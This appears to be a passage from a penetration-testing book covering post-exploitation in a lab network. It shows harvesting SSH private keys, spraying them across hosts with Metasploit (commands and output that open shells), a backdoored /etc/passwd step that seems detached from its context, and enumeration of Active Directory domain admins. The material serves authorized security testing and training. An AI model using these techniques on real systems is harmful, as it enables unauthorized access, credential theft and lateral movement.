### Conducting a Pass-the-Hash Style Attack Using SSH Private Keys

To perform a Pass-the-Hash style attack on the remaining systems in your scope, you will use SSH private keys instead of password hashes. In rare cases, this can lead to obtaining root access on another machine where the user whose SSH key you obtained from a level-one host has access to a level-two system and possesses root privileges on that system. This outcome justifies the effort to gather as many SSH keys as possible during post-exploitation and attempt to authenticate to other Linux or UNIX hosts on your network.

**Tip:**
In Chapter 4, you should have created protocol-specific target lists based on the ports and services identified during service discovery. Typically, all IP addresses with SSH identified are placed in a file called `ssh.txt`. Use this file to pass all your SSH keys when searching for access to level-two Linux or UNIX systems.

#### Backdooring the `/etc/passwd` File
1. Copy `passwd1` over to `/etc/passwd`, overwriting the system file.
2. Switch to the `pentest` user account, typing `P3nt3st!` at the prompt.
3. You now have unrestricted root access to the entire system.

### Locating and Stealing SSH Keys from a Compromised Host

SSH keys for the user account on which you are accessing your compromised system are typically located in the `~/.ssh` directory. However, users may store them elsewhere, so it's important to check. A simple `ls -l ~/.ssh` command will usually reveal if the user has any SSH keys. Copy any keys you find and store them on your attacking machine.

#### Example: Contents of the `~/.ssh` Directory
```bash
~$ ls -l ~/.ssh
total 12
-rw------- 1 root root    0 Feb 26  2019 authorized_keys
-rw-r--r-- 1 root root  222 Jan 24 18:36 known_hosts
-rw------- 1 root root 1679 Jan 24 18:25 pentestkey
-rw-r--r-- 1 root root  394 Jan 24 18:25 pentestkey.pub
```

If you are unsure about which file is the public key and which is the private key, you can use the `file` command to check:
```bash
~$ file pentestkey
pentestkey: PEM RSA private key
~$ file pentestkey.pub
pentestkey.pub: OpenSSH RSA public key
```

**Note:**
SSH keys that are password-protected are useless unless you know the password. Fortunately, users often create keys without a password.

### Using Metasploit to Pass SSH Keys

You have several options for passing SSH keys, but we'll use Metasploit, an industry favorite. The process is similar regardless of the tool used.

#### Scanning Multiple Targets with Metasploit

1. Store the private key you want to try to authenticate with on your attacking machine. If you're using a terminal, you can use the `cat` command to list the contents of the file and then copy and paste it into a new file on your system.
2. Open the Metasploit console and load the SSH Public Key Login Scanner module with `use auxiliary/scanner/ssh/ssh_login_pubkey`.
3. Set the target for this module by typing `set rhosts file:/path/to/your/ssh.txt`.
4. Specify a valid username and the path to your private key file.
5. Turn off verbose output for clarity with `set verbose false`.
6. Run the module with `run`.

**Example:**
```bash
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set KEY_PATH /home/royce/stolen_sshkey
KEY_PATH => /home/royce/stolen_sshkey
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts file:/home/royce/capsulecorp/discovery/services/ssh.txt
rhosts => file:/home/royce/capsulecorp/discovery/services/ssh.txt
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set username royce
username => royce
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > set verbose false
verbose => false
msf5 auxiliary(scanner/ssh/ssh_login_pubkey) > run
[*] 10.0.10.160:22 SSH - Testing Cleartext Keys
[+] 10.0.10.160:22 - Success: 'royce:-----BEGIN RSA PRIVATE KEY---------
[*] Command shell session 2 opened (10.0.10.160:35995 -> 10.0.10.160:22) at 2020-01-28 14:58:53 -0600
[*] 10.0.10.204:22 SSH - Testing Cleartext Keys
[*] Scanned 11 of 12 hosts (91% complete)
[*] 10.0.10.209:22 SSH - Testing Cleartext Keys
[*] Scanned 12 of 12 hosts (100% complete)
[*] Auxiliary module execution completed
```

The Metasploit module automatically opens a reverse shell to any targets that successfully authenticate with the provided username and private key. If you don't want this behavior, you can turn off the auto-session feature with `set CreateSession false`.

### Summary

- The three main components of post-exploitation are maintaining reliable re-entry, harvesting credentials, and moving laterally.
- Credentials can be discovered in configuration `.dot` files, directories, and bash history logs.
- Tunneling a reverse shell through SSH is a great way to maintain reliable re-entry into a compromised host.
- Cron jobs can be used to schedule a reverse shell callback automatically.
- Even if you donâ€™t have root on a system, you can potentially discover SSH keys that can be used to access other machines, even as root.

### Controlling the Entire Network

The final step in the post-exploitation and privilege-escalation phase of an internal network penetration test (INTP) is to take complete control of the enterprise network by gaining domain admin privileges in Active Directory. This chapter covers:

- Identifying domain admin users
- Locating systems with domain admin users logged in
- Enumerating domain controller volume shadow copies (VSS)
- Stealing `ntds.dit` from VSS
- Extracting Active Directory password hashes from `ntds.dit`

### Identifying Domain Admin User Accounts

To identify domain admin user accounts, use the `net` command, which comes native with Windows OS. Assume you have access to a Windows command prompt on one of your level-one or level-two systems.

#### Using `net` to Query Active Directory Groups

The syntax for the `net` command is straightforward:
```bash
net group "Domain Admins" /domain
```

**Example Output:**
```bash
The request will be processed at a domain controller for domain capsulecorp.local.
Group name     Domain Admins
Comment        Designated administrators of the domain
Members
---------------------------------------------------------------------------
Administrator            gokuadm                  serveradmin
The command completed successfully.
C:\Users\tien.CAPSULECORP>
```

In a modern enterprise network, you are likely to see multiple domain admin users. The more domain admin users there are, the higher the likelihood of finding a system with one logged in. As a systems administrator, it's best to limit the number of domain admin accounts to as few as possible.